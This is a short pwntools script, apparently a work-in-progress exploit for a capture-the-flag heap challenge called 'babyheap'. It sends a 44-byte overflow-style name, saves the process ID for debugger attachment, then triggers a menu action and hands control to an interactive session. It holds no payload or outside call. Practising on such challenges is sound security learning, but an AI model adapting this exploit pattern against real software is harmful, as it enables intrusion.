from pwn import *
p = process('./dist-babyheap/babyheap')
p.recvuntil(b'3. Make greycat talk\n')
p.sendline(b'2')
p.recvuntil(b'name:\n')
p.sendline(b'A'*44)
p.recvuntil(b'talk\n')
with open('pid.txt', 'w') as f2:
    f2.write(str(p.pid))
time.sleep(10)
p.sendline(b'3')
p.recvuntil(b'index: \n')
p.sendline(b'0')
p.interactive()
